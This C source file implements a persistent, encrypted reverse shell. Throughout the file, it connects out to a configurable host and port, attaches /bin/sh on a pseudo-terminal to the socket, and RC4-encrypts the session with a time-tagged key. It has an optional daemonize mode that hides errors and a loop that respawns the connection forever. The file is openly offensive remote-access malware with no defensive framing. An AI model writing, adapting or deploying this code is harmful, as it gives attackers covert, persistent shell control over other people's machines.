#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <pty.h>
#include <time.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/wait.h>

// Connection settings
#ifndef ENCRYPTION_KEY
#define ENCRYPTION_KEY "CHANGE_ME"
#endif

#ifndef CONNECT_HOST
#define CONNECT_HOST "127.0.0.1"
#endif

#ifndef CONNECT_PORT
#define CONNECT_PORT 4444
#endif

#ifndef SHELL_COMMAND
#define SHELL_COMMAND "/bin/sh"
#endif

#define BUFFER_LENGTH 1024

// Macros
#define UINT64_TO_BIG_ENDIAN_ARRAY(x, arr)             \
    {                                                  \
        uint64_t _num = (x);                           \
        if (__BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__) \
            _num = __builtin_bswap64(_num);            \
        memcpy((arr), &_num, sizeof(_num));            \
    }

#define SWAP(a, b)     \
    {                  \
        __typeof(a) t; \
        t = a;         \
        a = b;         \
        b = t;         \
    }

#ifdef DAEMONIZE
#define FATAL(msg) \
    {              \
        exit(1);   \
    }
#else
#define FATAL(msg)   \
    {                \
        perror(msg); \
        exit(1);     \
    }
#endif

typedef struct rc4_state
{
    uint8_t i;
    uint8_t j;
    uint8_t s[256];
} rc4_state;

/**
 * RC4 key scheduling
 * @param state RC4 state, initialized with key scheduling
 * @param key key
 * @param keylen key length
 */
void rc4_init(rc4_state *state, const char *key, int keylen)
{
    uint8_t j = 0;
    for (int i = 0; i < 256; i++)
        state->s[i] = i;
    for (int i = 0; i < 256; i++)
    {
        j = (j + state->s[i] + key[i % keylen]) % 256;
        SWAP(state->s[i], state->s[j]);
    }
    state->i = 0;
    state->j = 0;
}

/**
 * RC4 implementation
 * @param state RC4 state
 * @return next byte in the keystream
 */
uint8_t rc4_next(rc4_state *state)
{
    state->i = (state->i + 1) % 256;
    state->j = (state->j + state->s[state->i]) % 256;
    SWAP(state->s[state->i], state->s[state->j]);
    return state->s[(state->s[state->i] + state->s[state->j]) % 256];
}

/**
 * CRC64 implementation based on CRC64-ECMA
 * @param s input string
 * @return CRC64 hash
 */
uint64_t crc64(const char *s)
{
    uint64_t crc = 0xFFFFFFFFFFFFFFFF;
    while (*s)
    {
        crc ^= *s++;
        for (int i = 0; i < 8; i++)
            crc = (crc >> 1) ^ (0xC96C5795D7870F42 & -(crc & 1));
    }
    return ~crc;
}

int main(int argc, char **argv)
{
    int pid;

#ifdef DAEMONIZE
    for (int i = 0; i < 2; i++)
    {
        pid = fork();
        if (pid < 0)
            FATAL("daemonize fork")
        else if (pid > 0)
            return 0;
    }
#endif

    for (;;)
    {
        pid = fork();
        if (pid < 0)
            FATAL("daemon fork")
        else if (pid == 0)
            break;

        int status;
        waitpid(pid, &status, 0);

#ifndef DAEMONIZE
        printf("Child exited with status %d\n", status);
#endif
        sleep(1);
    }

    // Create a pty
    int master, slave;
    if (openpty(&master, &slave, NULL, NULL, NULL) < 0)
        FATAL("openpty");

    // Fork
    if ((pid = fork()) < 0)
        FATAL("fork")
    else if (pid == 0)
    {
        // Child
        // Close the master side of the pty
        close(master);

        if (setsid() < 0)
            FATAL("setsid")

        // Set the slave side of the pty as the controlling terminal
        if (ioctl(slave, TIOCSCTTY, NULL) < 0)
            FATAL("ioctl")

        dup2(slave, STDIN_FILENO);
        dup2(slave, STDOUT_FILENO);
        dup2(slave, STDERR_FILENO);

        // Execute a shell
        execl(SHELL_COMMAND, SHELL_COMMAND, NULL);
        FATAL("execl");
    }
    else
    {
        // Parent
        // Close the slave side of the pty
        close(slave);

        // Create a socket
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0)
            FATAL("socket");

        // Specify an address to connect to
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(CONNECT_PORT);
        addr.sin_addr.s_addr = inet_addr(CONNECT_HOST);

        // Connect it
        if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
            FATAL("connect");

        // tag format: crc64(ENCRYPTION_KEY + "%d" % time())
        time_t tag_time = time(NULL);
        char tag_string[sizeof(ENCRYPTION_KEY) + 16];
        sprintf(tag_string, "%s%lld", ENCRYPTION_KEY, (long long)tag_time);

        uint64_t tag = crc64(tag_string);
        char tag_buf[sizeof(tag)];
        UINT64_TO_BIG_ENDIAN_ARRAY(tag, tag_buf);

        // mangle encryption key to ensure difference every time
        char mangled_encryption_key[sizeof(ENCRYPTION_KEY)] = ENCRYPTION_KEY;
        for (int i = 0; i < sizeof(ENCRYPTION_KEY); i++)
            mangled_encryption_key[i] ^= tag_buf[i % sizeof(tag_buf)];

        // Send tag
        if (send(sockfd, &tag_buf, sizeof(tag_buf), 0) < 0)
            FATAL("send tag")

        // Initialize RC4 states
        rc4_state rc4recv, rc4send;
        rc4_init(&rc4recv, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);
        rc4_init(&rc4send, mangled_encryption_key, sizeof(mangled_encryption_key) - 1);

        // Create duplex socket connection by polling
        int fd_max = sockfd > master ? sockfd : master;
        char buffer[BUFFER_LENGTH];

        for (;;)
        {
            fd_set readfds;
            FD_ZERO(&readfds);
            FD_SET(sockfd, &readfds);
            FD_SET(master, &readfds);

            struct timeval timeout;
            timeout.tv_sec = 0;
            timeout.tv_usec = 100 * 1000; // 100ms

            if (select(fd_max + 1, &readfds, NULL, NULL, &timeout) < 0)
                FATAL("select")

            if (FD_ISSET(sockfd, &readfds))
            {
                // Read from socket and write to pty
                int n = recv(sockfd, buffer, sizeof(buffer), 0);
                if (n == 0)
                    break;
                if (n < 0)
                    FATAL("recv read")
                else if (n > 0)
                {
                    for (int i = 0; i < n; i++)
                        buffer[i] ^= rc4_next(&rc4recv);
                    write(master, buffer, n);
                }
            }

            if (FD_ISSET(master, &readfds))
            {
                // Read from pty and write to socket
                int n = read(master, buffer, BUFFER_LENGTH);
                if (n == 0)
                    break;
                if (n < 0)
                    FATAL("send read")
                else if (n > 0)
                {
                    for (int i = 0; i < n; i++)
                        buffer[i] ^= rc4_next(&rc4send);
                    write(sockfd, buffer, n);
                }
            }
        }
    }

    return 0;
}